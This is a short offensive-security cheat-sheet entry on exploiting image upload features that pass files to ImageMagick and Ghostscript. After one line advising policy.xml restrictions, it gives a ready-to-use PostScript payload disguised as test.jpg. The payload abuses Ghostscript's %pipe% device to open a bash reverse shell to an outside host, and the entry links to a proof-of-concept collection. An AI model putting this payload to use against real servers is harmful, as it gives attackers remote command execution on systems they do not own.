### Is there image uploading functionality and then they are doing some conversion in uploaded image? Maybe they are using imagemagick library for processing the image.
In imagemagick, everyone should update their policy.xml file so block other file extensions like  EPS,PS,PDF and XPS since all these have ways to trigger Ghostscript
save this PS file with test.jpg and see if you get rev shell or simply you can try to see dns query result.(outbound traffic may have been disabled)
```
%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/███/8080 0>&1') currentdevice putdeviceprops
```
Or visit this github `https://github.com/ImageTragick/PoCs`

##
